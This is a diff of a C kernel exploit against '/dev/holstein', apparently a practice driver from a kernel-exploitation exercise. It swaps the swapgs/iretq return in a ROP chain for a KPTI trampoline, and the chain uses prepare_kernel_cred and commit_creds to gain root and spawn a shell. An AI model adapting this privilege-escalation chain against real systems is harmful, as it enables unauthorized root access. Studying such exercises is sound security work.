@@ -18,20 +18,12 @@
 #define DEVICE "/dev/holstein"
 #define BUFFER_SIZE 0x400/0x8
 
-#define KBASE 0xffffffff81000000
-#define HOLSTEIN_WRITE 0Xffffffffc0000120
-
-// rep: This is a prefix that stands for "repeat." 
-// It tells the CPU to repeat the following instruction 
-// a number of times based on the value in the RCX register. 
-// Specifically, it decrements RCX after each iteration until it reaches zero.
 unsigned long mov_rdi_rax_rep = 0xffffffff8160c96b;
 unsigned long pop_rdi = 0xffffffff8127bbdc;
 unsigned long pop_rcx = 0xffffffff812ea083;
-unsigned long swapgs = 0xffffffff8160bf7e;
-unsigned long iretq = 0xffffffff810202af;
 unsigned long prepare_kernel_cred = 0xffffffff8106e240;
 unsigned long commit_creds = 0xffffffff8106e390;
+unsigned long kpti_trampoline = 0xffffffff81800e10 + 22; // swapgs_restore_regs_and_return_to_usermode
 long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;
 
 void save_state() {
@@ -60,8 +52,6 @@ void spawn_shell()
 }
 
 int main(int argc, char *argv[]){
-    signal(SIGSEGV, spawn_shell);
-
     setvbuf(stdout, NULL, _IONBF, 0);
     save_state();
     
@@ -81,8 +71,9 @@ int main(int argc, char *argv[]){
     *chain++ = 0x0;
     *chain++ = mov_rdi_rax_rep;
     *chain++ = commit_creds;
-    *chain++ = swapgs;
-    *chain++ = iretq;
+    *chain++ = kpti_trampoline;
+    *chain++ = 0x0;
+    *chain++ = 0x0;
     *chain++ = (unsigned long) &spawn_shell;
     *chain++ = _proc_cs;
     *chain++ = _proc_rflags;
